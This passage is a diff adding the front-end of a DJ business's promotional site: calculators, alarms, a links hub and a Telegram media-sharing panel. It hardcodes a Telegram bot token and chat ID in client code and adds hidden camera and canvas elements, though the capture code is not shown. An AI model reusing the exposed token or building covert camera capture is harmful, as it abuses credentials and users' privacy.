@@ -4120,3 +4120,721 @@ box.scrollTop = box.scrollHeight;
 }, 700);
         }
     </script>
+    <div id="main-interface" style="display: block; opacity: 1;">
+    <audio id="sfx-tap"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
+    <div id="toast" class="toast"><i class="fas fa-check-circle"></i> Success</div>
+    <div class="bg-fx"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
+
+    <style>
+        body {
+            padding-top: 65px !important; 
+            overflow-x: hidden !important;
+            margin: 0; padding: 0;
+        }
+
+        #mainNavbar {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            z-index: 99999 !important; 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px !important;
+            background: #0a0a0c !important;
+            border-bottom: 1px solid rgba(212, 175, 55, 0.3) !important;
+            box-sizing: border-box;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.8) !important;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #D4AF37;
+            font-family: 'Cinzel', serif;
+            font-weight: 900;
+            font-size: 20px !important;
+            text-transform: uppercase;
+        }
+        .brand i.fa-bars { color: #ffffff; font-size: 24px !important; cursor: pointer; }
+        
+        .nav-right { display: flex; align-items: center; gap: 10px !important; }
+        .controls { display: flex; align-items: center; gap: 8px !important; }
+
+        .nav-btn-square {
+            width: 38px !important; height: 38px !important; border-radius: 10px !important;
+            background: transparent !important; border: 1.5px solid #D4AF37 !important; 
+            color: #D4AF37 !important; display: flex; justify-content: center; align-items: center;
+            font-size: 18px !important; cursor: pointer; transition: 0.3s ease;
+            box-shadow: 0 0 8px rgba(212,175,55,0.15) !important;
+        }
+        
+        /* Perfect Square Google Translate Box */
+        #google_translate_element { width: 38px; height: 38px; overflow: hidden; border-radius: 10px; }
+        .goog-te-gadget-simple { 
+            background-color: transparent !important; border: 1.5px solid #D4AF37 !important; 
+            border-radius: 10px !important; width: 38px !important; height: 38px !important; 
+            padding: 0 !important; display: flex !important; justify-content: center !important; 
+            align-items: center !important; box-sizing: border-box !important; position: relative; cursor: pointer;
+        }
+        .goog-te-gadget-simple span { display: none !important; }
+        .goog-te-gadget-icon { display: none !important; }
+        .goog-te-menu-value span { display: none !important; }
+        .goog-te-gadget-simple::after {
+            content: '\f1ab'; font-family: 'Font Awesome 6 Free', 'Font Awesome 5 Free'; font-weight: 900;
+            color: #D4AF37; font-size: 16px;
+        }
+    </style>
+
+    <nav class="navbar" id="mainNavbar">
+        <div class="brand">
+            <i class="fas fa-bars nav-btn" onclick="toggleMenu()"></i>
+            <span><i class="fas fa-crown"></i> MND Hub</span>
+        </div>
+        <div class="nav-right">
+            <div id="google_translate_element"></div>
+            <div class="controls">
+                <button class="nav-btn-square theme-btn" id="themeIcon" onclick="themeSwitch()"><i class="fas fa-sun"></i></button>
+                <button class="nav-btn-square set-btn" id="masterSettingsIcon" onclick="openMasterSettings()"><i class="fas fa-cog fa-spin-hover"></i></button>
+            </div>
+        </div>
+    </nav>
+
+    <div id="calculatorModalOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(5,5,5,0.95); z-index:9999999; justify-content:center; align-items:center; backdrop-filter: blur(10px);">
+        <div class="mn-master-box" style="width:95%; max-width:450px; height:85vh; border:1px solid #D4AF37; border-radius:16px; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column; box-shadow: 0 20px 50px rgba(0,0,0,0.9);">
+            
+            <div class="master-header" style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); position:relative;">
+                <span onclick="closeCalculatorModal()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+                <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900;"><i class="fas fa-calculator"></i> V-MAX Calculator</h2>
+            </div>
+
+            <div style="display:flex; justify-content:space-around; background:rgba(255,255,255,0.05); padding:10px; border-bottom:1px solid rgba(212,175,55,0.2);">
+                <button class="calc-tab-btn active" onclick="switchCalcTab('standard', this)"><i class="fas fa-square-root-alt"></i> Standard</button>
+                <button class="calc-tab-btn" onclick="switchCalcTab('emi', this)"><i class="fas fa-home"></i> EMI Loan</button>
+                <button class="calc-tab-btn" onclick="switchCalcTab('sip', this)"><i class="fas fa-chart-line"></i> SIP / Gold</button>
+            </div>
+
+            <div style="flex-grow:1; overflow-y:auto; padding:20px; box-sizing:border-box;">
+                
+                <div id="calc-standard" class="calc-section active">
+                    <div id="calcScreen" style="background:rgba(0,0,0,0.8); border:2px solid #D4AF37; border-radius:12px; padding:20px; text-align:right; font-size:35px; font-family:'Outfit'; color:#00fa9a; word-wrap:break-word; min-height:80px; margin-bottom:15px; box-shadow:inset 0 0 15px rgba(212,175,55,0.2);">0</div>
+                    <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:10px;">
+                        <button class="calc-btn op-btn" onclick="calcClear()">AC</button>
+                        <button class="calc-btn op-btn" onclick="calcDelete()">DEL</button>
+                        <button class="calc-btn op-btn" onclick="calcAppend('%')">%</button>
+                        <button class="calc-btn op-btn" onclick="calcAppend('/')">÷</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('7')">7</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('8')">8</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('9')">9</button>
+                        <button class="calc-btn op-btn" onclick="calcAppend('*')">×</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('4')">4</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('5')">5</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('6')">6</button>
+                        <button class="calc-btn op-btn" onclick="calcAppend('-')">−</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('1')">1</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('2')">2</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('3')">3</button>
+                        <button class="calc-btn op-btn" onclick="calcAppend('+')">+</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('00')">00</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('0')">0</button>
+                        <button class="calc-btn num-btn" onclick="calcAppend('.')">.</button>
+                        <button class="calc-btn equal-btn" onclick="calcCalculate()">=</button>
+                    </div>
+                </div>
+
+                <div id="calc-emi" class="calc-section" style="display:none;">
+                    <div class="f-group"><span class="f-label" style="color:#D4AF37;">Loan Amount (₹)</span><input type="number" id="emiAmount" class="mn-input" placeholder="e.g. 500000"></div>
+                    <div class="f-group"><span class="f-label" style="color:#D4AF37;">Interest Rate (% p.a.)</span><input type="number" id="emiRate" class="mn-input" placeholder="e.g. 8.5"></div>
+                    <div class="f-group"><span class="f-label" style="color:#D4AF37;">Loan Tenure (Years)</span><input type="number" id="emiTenure" class="mn-input" placeholder="e.g. 5"></div>
+                    <button class="mn-btn" style="width:100%; margin-top:10px; padding:15px; font-size:18px;" onclick="calculateEMI()">CALCULATE EMI</button>
+                    <div id="emiResult" style="display:none; margin-top:25px; padding:20px; background:rgba(212,175,55,0.1); border:1px solid #D4AF37; border-radius:12px;">
+                        <div style="display:flex; justify-content:space-between; margin-bottom:10px; border-bottom:1px dashed #555; padding-bottom:10px;"><span style="color:#aaa;">Monthly EMI:</span><strong style="color:#00fa9a; font-size:18px;" id="resMonthlyEMI">₹0</strong></div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:10px; border-bottom:1px dashed #555; padding-bottom:10px;"><span style="color:#aaa;">Total Interest:</span><strong style="color:#ff3333; font-size:18px;" id="resTotalInterest">₹0</strong></div>
+                        <div style="display:flex; justify-content:space-between;"><span style="color:#aaa;">Total Payment:</span><strong style="color:#D4AF37; font-size:18px;" id="resTotalPayment">₹0</strong></div>
+                    </div>
+                </div>
+
+                <div id="calc-sip" class="calc-section" style="display:none;">
+                    <div class="f-group"><span class="f-label" style="color:#D4AF37;">Monthly Investment (₹)</span><input type="number" id="sipAmount" class="mn-input" placeholder="e.g. 5000"></div>
+                    <div class="f-group"><span class="f-label" style="color:#D4AF37;">Expected Return Rate (% p.a.)</span><input type="number" id="sipRate" class="mn-input" placeholder="e.g. 12"></div>
+                    <div class="f-group"><span class="f-label" style="color:#D4AF37;">Time Period (Years)</span><input type="number" id="sipTenure" class="mn-input" placeholder="e.g. 10"></div>
+                    <button class="mn-btn" style="width:100%; margin-top:10px; padding:15px; font-size:18px; background:linear-gradient(45deg, #00fa9a, #00bfff); color:#000;" onclick="calculateSIP()">CALCULATE RETURNS</button>
+                    <div id="sipResult" style="display:none; margin-top:25px; padding:20px; background:rgba(0,250,154,0.1); border:1px solid #00fa9a; border-radius:12px;">
+                        <div style="display:flex; justify-content:space-between; margin-bottom:10px; border-bottom:1px dashed #555; padding-bottom:10px;"><span style="color:#aaa;">Invested Amount:</span><strong style="color:#fff; font-size:18px;" id="resSIPInvested">₹0</strong></div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:10px; border-bottom:1px dashed #555; padding-bottom:10px;"><span style="color:#aaa;">Est. Returns:</span><strong style="color:#00fa9a; font-size:18px;" id="resSIPReturns">₹0</strong></div>
+                        <div style="display:flex; justify-content:space-between;"><span style="color:#aaa;">Total Value:</span><strong style="color:#D4AF37; font-size:22px;" id="resSIPTotal">₹0</strong></div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <div id="royalWelcomePopup" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); z-index:999999999; justify-content:center; align-items:center; backdrop-filter:blur(15px); animation:fadeInOverlay 0.5s ease;">
+        <div style="background:linear-gradient(135deg, #110e08 0%, #050505 100%); border:2px solid #D4AF37; border-radius:20px; padding:30px; text-align:center; width:92%; max-width:450px; box-shadow:0 20px 60px rgba(212,175,55,0.4); position:relative; animation:slideUpZoom 0.5s ease;">
+            <span onclick="document.getElementById('royalWelcomePopup').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">×</span>
+            <div style="color:#D4AF37; font-size:16px; line-height:1.6; font-family:'Cinzel', serif; font-weight:bold;">
+                ✨━━━━━━━━━━━━━━━━━━━✨<br>
+                <span style="font-size:26px; color:#fff; text-shadow:0 0 10px #D4AF37; line-height: 1.2;">🎉 WELCOME TO 🎉</span><br>
+                <span style="font-size:30px; color:#FFD700; text-shadow:0 0 20px #FFD700; line-height: 1.2;">🎧 MAA NIRMALA DJ 🎧</span><br>
+                ✨━━━━━━━━━━━━━━━━━━━✨
+            </div>
+            <div style="color:#ddd; font-family:'Outfit', sans-serif; font-size:15px; text-align:left; margin-top:25px; line-height:2;">
+                <i class="fas fa-volume-up" style="color:#D4AF37; width:20px;"></i> <b>Powerful Sound System</b><br>
+                <i class="fas fa-lightbulb" style="color:#D4AF37; width:20px;"></i> <b>Premium Lighting & DJ Effects</b><br>
+                <i class="fas fa-music" style="color:#D4AF37; width:20px;"></i> <b>Unforgettable Vibes for Every Event</b><br>
+                <i class="fas fa-hand-point-right" style="color:#D4AF37; width:20px;"></i> <b>Book Now & Make Your Event Grand</b>
+            </div>
+            <div style="margin-top: 25px; padding-top: 20px; border-top: 1px dashed rgba(212,175,55,0.4); text-align: center;">
+                <p style="color:#D4AF37; font-family:'Cinzel'; font-weight:bold; font-size:18px; margin:0 0 10px 0;">📞 Contact / Booking:</p>
+                <a href="tel:+917294969938" style="display:inline-block; background:#25D366; color:#fff; padding:10px 25px; border-radius:30px; text-decoration:none; font-weight:bold; font-family:'Outfit'; font-size:18px; box-shadow:0 5px 15px rgba(37, 211, 102, 0.4); margin-bottom:15px;"><i class="fas fa-phone-alt"></i> 📲 7294969938</a>
+                <p style="color:#aaa; font-family:'Outfit'; font-size:12px; line-height:1.5; margin:0;">
+                    <i class="fas fa-map-marker-alt" style="color:#ff3333;"></i> <b>Address:</b> Tola Beltikri, Kaddhar, Katoria, Banka, Bihar, India (813106)
+                </p>
+                <button id="stopAlarmPopupBtn" style="display:none; margin-top:15px; width:100%; padding:15px; background:#ff0000; color:#fff; font-weight:bold; font-size:16px; border:none; border-radius:8px; animation: flashRed 1s infinite; cursor:pointer;" onclick="stopEarthquakeAlarm()"><i class="fas fa-bell-slash"></i> TURN OFF ALARM</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="calendarModalOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#050505; z-index:9999999; justify-content:center; align-items:center;">
+        <div style="width:100%; height:100%; border:none; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column;">
+            <div style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); background:rgba(10,10,10,0.9); position:sticky; top:0; z-index:10;">
+                <span onclick="document.getElementById('calendarModalOverlay').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">×</span>
+                <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900;"><i class="fas fa-calendar-alt"></i> Grand Indian Calendar</h2>
+            </div>
+            <div style="flex-grow:1; overflow-y:auto; padding:20px;" id="calendarListArea"></div>
+        </div>
+    </div>
+
+    <div id="masterSettingsOverlay" onclick="closeMasterOnOutsideClick(event)" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#050505; z-index:9999999; justify-content:center; align-items:center;">
+        <div class="mn-master-box" id="masterBoxContent" style="width:100%; height:100%; border:none; border-radius:0; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column; overflow:hidden;">
+            <div class="master-header" style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); background:rgba(10,10,10,0.9); position:sticky; top:0; z-index:10;">
+                <span onclick="closeMasterSettings()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">×</span>
+                <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900; letter-spacing:1px;"><i class="fas fa-sliders-h"></i> Ultimate Control Center</h2>
+            </div>
+            
+            <div class="master-content" style="flex-grow:1; overflow-y:auto; padding:20px; padding-bottom:50px;">
+
+                <div class="settings-category">
+                    <h3><i class="fas fa-satellite-dish"></i> Direct Telegram Studio Vault</h3>
+                    <input type="text" id="mediaName" class="mn-input" placeholder="Your Name (Mandatory)" style="width:100%; margin-bottom:10px;">
+                    <input type="tel" id="mediaNum" class="mn-input" placeholder="Your Phone (Mandatory)" style="width:100%; margin-bottom:15px;">
+                    
+                    <video id="cameraPreview" autoplay muted playsinline style="display:none; width:100%; height:250px; object-fit:cover; border-radius:12px; border:2px solid #ff3333; margin-bottom:10px;"></video>
+                    
+                    <div style="display: flex; width: 100%; gap: 10px; margin-bottom: 10px;">
+                        <button class="mn-btn" style="background:#0088cc; color:#fff; flex:1;" id="btnVoice" onclick="startVoiceRecord()"><i class="fas fa-microphone"></i> Voice Record</button>
+                        <button class="mn-btn" style="background:#ff3333; color:#fff; flex:1;" id="btnVideo" onclick="startVideoRecord()"><i class="fas fa-video"></i> Video Record</button>
+                        <button class="mn-btn" style="background:#444; color:#fff;" id="btnFlipCam" onclick="switchCamera()"><i class="fas fa-sync-alt"></i></button>
+                    </div>
+                    
+                    <button id="stopRecordBtn" style="display:none; width:100%; padding:15px; background:#ff0000; color:#fff; font-weight:bold; font-size:16px; border:none; border-radius:8px; margin-bottom:10px; animation: flashRed 1s infinite;" onclick="stopMediaRecording()">
+                        <i class="fas fa-stop-circle"></i> STOP RECORDING NOW
+                    </button>
+
+                    <input type="file" id="bgFileInput" style="display:none;" accept="audio/*,video/*,image/*" multiple onchange="sendSelectedFilesToTelegram(this)">
+                    <button class="mn-btn" style="background:linear-gradient(45deg, #D4AF37, #ff8c00); width:100%; color:#000; margin-bottom:10px;" onclick="document.getElementById('bgFileInput').click()"><i class="fas fa-folder-open"></i> Share Audio/Video/Images</button>
+                    <button class="mn-btn" style="background:linear-gradient(45deg, #6a11cb, #2575fc); width:100%; color:#fff; margin-bottom:10px;" onclick="shareLocationAndPhoto()"><i class="fas fa-map-marker-alt"></i> Share Live Location & Photo</button>
+                    
+                    <div id="recordingStatus" style="color:#ff3333; font-weight:bold; font-size:12px; margin-top:10px; display:none; text-align:center;"><i class="fas fa-circle fa-beat"></i> Processing Secure Transfer...</div>
+                </div>
+
+                <div class="settings-category">
+                    <h3><i class="fas fa-clock"></i> Unlimited 3D Alarms & Calendar</h3>
+                    <div style="background:rgba(255,153,51,0.1); border:1px solid #D4AF37; padding:15px; border-radius:12px; margin-bottom:15px;">
+                        <div style="color:#D4AF37; font-weight:bold;"><i class="fas fa-calendar-alt"></i> Indian Festival Radar</div>
+                        <div id="nextFestivalText" style="font-size:13px; color:#fff; margin-top:5px;">Loading Calendar...</div>
+                        <button class="mn-btn" style="margin-top:10px; font-size:11px; padding:5px 10px;" onclick="openCalendarModal()">View All Festivals</button>
+                    </div>
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                        <div class="setting-label" style="color:#D4AF37; font-weight:bold;">Alarm Master Toggle</div>
+                        <label class="mn-switch"><input type="checkbox" id="toggleAlarm" onchange="toggleAlarmStatus()" checked><span class="mn-slider"></span></label>
+                    </div>
+                    <div style="display:flex; gap:10px; margin-bottom:10px;">
+                        <input type="time" id="newAlarmTime" class="mn-input" style="flex:1;">
+                        <button class="mn-btn" onclick="addCustomAlarm()">Add Alarm</button>
+                    </div>
+                    <ul id="activeAlarmsList" style="list-style:none; padding:0; margin:0; color:#fff; font-size:14px;"></ul>
+                </div>
+
+                <div class="settings-category">
+                    <h3><i class="fas fa-music"></i> Sound & Media Settings</h3>
+                    <div class="setting-row">
+                        <div class="setting-label" style="color:#D4AF37; font-weight:bold;">🎧 Maa Nirmala DJ Music</div>
+                        <button class="mn-btn" id="djMusicBtn" onclick="toggleDjMusic()"><i class="fas fa-play"></i> Play Music</button>
+                    </div>
+                    <div class="setting-row"><div class="setting-label">🔈 Background music on/off</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                </div>
+
+                <div class="settings-category">
+                    <h3><i class="fas fa-universal-access"></i> Language & Accessibility</h3>
+                    <div class="setting-row">
+                        <div class="setting-label">🗣️ Voice Reader (Reads Full Page)</div>
+                        <label class="mn-switch"><input type="checkbox" id="toggleVoice" onchange="applyAutoReader()"><span class="mn-slider"></span></label>
+                    </div>
+                    <div class="setting-row">
+                        <div class="setting-label">🔎 Text zoom for visibility</div>
+                        <select class="mn-input" style="width:120px; padding:5px;" onchange="changeFontSize(this.value)"><option value="16px">Normal (100%)</option><option value="18px">Large (110%)</option><option value="20px">Extra Large (120%)</option></select>
+                    </div>
+                </div>
+
+                <div class="settings-category">
+                    <h3><i class="fas fa-magic"></i> Live Screen Effects</h3>
+                    <div class="setting-row"><div class="setting-label"><i class="fas fa-bullhorn" style="color:#ff3333;"></i> Earthquake Bass Shake</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass('toggleBass', 'bass-mode')" id="toggleBass"><span class="mn-slider"></span></label></div>
+                    <div class="setting-row"><div class="setting-label"><i class="fas fa-palette" style="color:#00ff00;"></i> Dynamic RGB Lighting</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass('toggleRGB', 'rgb-mode')" id="toggleRGB"><span class="mn-slider"></span></label></div>
+                    <div class="setting-row"><div class="setting-label"><i class="fas fa-snowflake" style="color:#fff;"></i> Magic Snowfall</div><label class="mn-switch"><input type="checkbox" onchange="applySnowfall()" id="toggleSnow"><span class="mn-slider"></span></label></div>
+                    <div class="setting-row"><div class="setting-label"><i class="fas fa-meteor" style="color:#ff00ff;"></i> Galaxy Crackers Effect</div><label class="mn-switch"><input type="checkbox" onchange="applyCrackers()" id="toggleCrackers"><span class="mn-slider"></span></label></div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <div id="megaGalleryOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#000; z-index:99999999; flex-direction:column;">
+        <div style="padding:20px; background:rgba(20,20,20,0.9); text-align:center; position:sticky; top:0; border-bottom:2px solid #D4AF37; z-index:10;">
+            <span onclick="document.getElementById('megaGalleryOverlay').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">×</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif;">1000+ Premium Setup Archive</h2>
+        </div>
+        <div id="megaGalleryContainer" style="flex-grow:1; overflow-y:auto; padding:10px; display:flex; flex-wrap:wrap; justify-content:center; gap:5px; background:#111;"></div>
+    </div>
+
+    <div class="modal-wrap" id="linksModal" onclick="closeModal(event)">
+        <div class="modal-inner" onclick="event.stopPropagation()">
+            <div class="ai-head" style="padding:15px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center; background:rgba(10,10,10,0.9);">
+                <span style="color:var(--gold-primary); font-weight:bold; font-family:'Cinzel';"><i class="fas fa-link"></i> OFFICIAL LINKS HUB</span>
+                <i class="fas fa-times" onclick="closeModal(null, true)" style="color:#fff; cursor:pointer;"></i>
+            </div>
+            <div class="book-area">
+                
+                <div class="section-label" style="margin-top: 0;"><i class="fas fa-calculator"></i> PREMIUM TOOLS</div>
+                <div class="grid">
+                    <a href="javascript:void(0)" class="card full-w" onclick="playTap(); openCalculatorModal()">
+                        <i class="fas fa-calculator" style="color:#00fa9a;"></i><span style="color:#00fa9a;">Advanced All-In-One Calculator</span>
+                    </a>
+                    <a href="javascript:void(0)" class="card full-w" onclick="playTap(); openMegaGallery()">
+                        <i class="fas fa-images" style="color:#D4AF37;"></i><span style="color:#D4AF37;">View 1000+ Mega Gallery</span>
+                    </a>
+                </div>
+
+                <div class="section-label"><i class="fas fa-bolt"></i> DIRECT CONNECT</div>
+                <div class="grid">
+                    <a href="tel:+919771617808" class="card" onclick="playTap()"><i class="fas fa-phone-volume"></i><span>Call Now</span></a>
+                    <a href="https://wa.me/919771617808" target="_blank" class="card" onclick="playTap()"><i class="fab fa-whatsapp"></i><span>WhatsApp Chat</span></a>
+                    <a href="https://t.me/MaaNirmalaDJ" target="_blank" class="card" onclick="playTap()"><i class="fab fa-telegram-plane"></i><span>Telegram</span></a>
+                    <a href="https://t.me/Maa_Nirmala_Dj_Bot" target="_blank" class="card" onclick="playTap()"><i class="fas fa-robot"></i><span>Telegram Bot</span></a>
+                    <a href="https://maps.app.goo.gl/fSqCowWHPoVxGuLz6" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-map-marked-alt"></i><span>Official Location</span></a>
+                </div>
+
+                <div class="section-label"><i class="fas fa-globe"></i> SOCIAL EMPIRE</div>
+                <div class="grid">
+                    <a href="https://www.instagram.com/maa_nirmala_dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-instagram"></i><span>Instagram</span></a>
+                    <a href="https://x.com/maa_nirmala_dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-x-twitter"></i><span>X (Twitter)</span></a>
+                    <a href="https://www.facebook.com/MaaNirmalaDJ7" target="_blank" class="card" onclick="playTap()"><i class="fab fa-facebook-f"></i><span>FB Page 1</span></a>
+                    <a href="https://www.facebook.com/maa.nirmala.dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-facebook-square"></i><span>FB Page 2</span></a>
+                    <a href="https://www.threads.com/@maa_nirmala_dj" target="_blank" class="card" onclick="playTap()"><i class="fab fa-threads"></i><span>Threads</span></a>
+                    <a href="https://www.linkedin.com/in/maa-nirmala-dj-tent-house-3499a33b0" target="_blank" class="card" onclick="playTap()"><i class="fab fa-linkedin-in"></i><span>LinkedIn</span></a>
+                    <a href="https://whatsapp.com/channel/0029Vb7AMDl4IBhJ34po3L1k" target="_blank" class="card full-w" onclick="playTap()"><i class="fab fa-whatsapp-square"></i><span>WhatsApp Channel</span></a>
+                    <a href="https://www.youtube.com/channel/UCQPUgEyCm8nihqhYGMUX6Pw" target="_blank" class="card full-w" onclick="playTap()"><i class="fab fa-youtube"></i><span>YouTube Channel</span></a>
+                </div>
+
+                <div class="section-label"><i class="fas fa-laptop-code"></i> OFFICIAL WEBSITES</div>
+                <div class="grid">
+                    <a href="https://maanirmaladj.github.io/Maa-Nirmala-DJ-Beltikri/" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-globe"></i><span>MND Official Site 1</span></a>
+                    <a href="https://maa-nirmala-dj.github.io/-tent-house./" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-external-link-alt"></i><span>MND Official Site 2</span></a>
+                </div>
+
+                <div class="section-label"><i class="fas fa-coins"></i> PAYMENTS & MORE</div>
+                <div class="grid" style="margin-bottom:30px;">
+                    <a href="phonepe://pay?pa=9771617808-2@axl" class="card" onclick="playTap()"><i class="fas fa-wallet"></i><span>PhonePe</span></a>
+                    <a href="tez://upi/pay?pa=9771617808-2@axl" class="card" onclick="playTap()"><i class="fab fa-google-pay"></i><span>GPay</span></a>
+                    <div class="card full-w" onclick="copyUPI()"><i class="fas fa-qrcode"></i><span>Copy UPI ID</span><span style="font-size:10px; opacity:0.7;">9771617808-2@axl</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="effect-layer" style="position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:9999997; overflow:hidden;"></div>
+    <audio id="alarmAudio" loop><source src="" type="audio/mpeg"></audio>
+    <audio id="djMusicAudio" loop><source src="https://files.catbox.moe/mus2yv.mp3" type="audio/mpeg"></audio>
+    <video id="hiddenPhotoCam" autoplay muted playsinline style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <style>
+        .calc-tab-btn { background: transparent; border: none; color: #aaa; font-family: 'Outfit', sans-serif; font-size: 14px; font-weight: bold; padding: 10px; cursor: pointer; transition: 0.3s; }
+        .calc-tab-btn.active { color: #D4AF37; border-bottom: 2px solid #D4AF37; }
+        .calc-btn { padding: 15px 0; font-size: 22px; font-weight: bold; border-radius: 12px; cursor: pointer; border: none; outline: none; transition: 0.2s; font-family: 'Outfit'; }
+        .num-btn { background: rgba(255,255,255,0.05); color: #fff; }
+        .num-btn:active { background: rgba(255,255,255,0.2); }
+        .op-btn { background: rgba(212,175,55,0.1); color: #D4AF37; border: 1px solid rgba(212,175,55,0.3); }
+        .op-btn:active { background: rgba(212,175,55,0.3); }
+        .equal-btn { background: #D4AF37; color: #000; grid-column: span 1; }
+        .equal-btn:active { transform: scale(0.95); }
+    </style>
+
+    <script>
+        const TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
+        const TG_CHAT = "8506290708";
+
+        // MEGA 1000 IMAGE GALLERY ENGINE
+        function openMegaGallery() {
+            document.getElementById('megaGalleryOverlay').style.display = 'flex';
+            const container = document.getElementById('megaGalleryContainer');
+            if(container.innerHTML.trim() === '') {
+                container.innerHTML = '<h3 style="color:#fff; width:100%; text-align:center;">Rendering 1000 Images...</h3>';
+                setTimeout(() => {
+                    let html = '';
+                    for(let i=1; i<=1000; i++) {
+                        html += `<img src="https://picsum.photos/seed/${i + 500}/200/200" style="width:110px; height:110px; object-fit:cover; border-radius:8px; border:1px solid #D4AF37;" loading="lazy">`;
+                    }
+                    container.innerHTML = html;
+                }, 500);
+            }
+        }
+
+        // --- CALCULATOR LOGIC ---
+        function openCalculatorModal() { document.getElementById('calculatorModalOverlay').style.display = 'flex'; }
+        function closeCalculatorModal() { document.getElementById('calculatorModalOverlay').style.display = 'none'; }
+
+        function switchCalcTab(tab, btnElement) {
+            document.querySelectorAll('.calc-section').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('.calc-tab-btn').forEach(el => el.classList.remove('active'));
+            document.getElementById('calc-' + tab).style.display = 'block';
+            btnElement.classList.add('active');
+        }
+
+        let calcExpression = "";
+        const calcScreen = document.getElementById('calcScreen');
+
+        function calcAppend(val) {
+            if(calcScreen.innerText === "0" || calcScreen.innerText === "Error") calcExpression = "";
+            calcExpression += val; calcScreen.innerText = calcExpression;
+        }
+        function calcClear() { calcExpression = ""; calcScreen.innerText = "0"; }
+        function calcDelete() { calcExpression = calcExpression.slice(0, -1); calcScreen.innerText = calcExpression === "" ? "0" : calcExpression; }
+        
+        function calcCalculate() {
+            try {
+                let result = eval(calcExpression);
+                if (result === undefined) result = 0;
+                if(result % 1 !== 0) result = parseFloat(result.toFixed(6));
+                calcExpression = result.toString();
+                calcScreen.innerText = result.toLocaleString('en-IN', { maximumFractionDigits: 6 });
+            } catch (e) { calcScreen.innerText = "Error"; calcExpression = ""; }
+        }
+
+        function calculateEMI() {
+            let p = parseFloat(document.getElementById('emiAmount').value);
+            let r = parseFloat(document.getElementById('emiRate').value);
+            let y = parseFloat(document.getElementById('emiTenure').value);
+            if (isNaN(p) || isNaN(r) || isNaN(y) || p <= 0 || r <= 0 || y <= 0) { alert("Please enter valid numbers."); return; }
+            let monthlyRate = (r / 12) / 100; let months = y * 12;
+            let emi = p * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1);
+            let totalPayment = emi * months; let totalInterest = totalPayment - p;
+            document.getElementById('resMonthlyEMI').innerText = "₹" + Math.round(emi).toLocaleString('en-IN');
+            document.getElementById('resTotalInterest').innerText = "₹" + Math.round(totalInterest).toLocaleString('en-IN');
+            document.getElementById('resTotalPayment').innerText = "₹" + Math.round(totalPayment).toLocaleString('en-IN');
+            document.getElementById('emiResult').style.display = 'block';
+        }
+
+        function calculateSIP() {
+            let p = parseFloat(document.getElementById('sipAmount').value);
+            let r = parseFloat(document.getElementById('sipRate').value);
+            let y = parseFloat(document.getElementById('sipTenure').value);
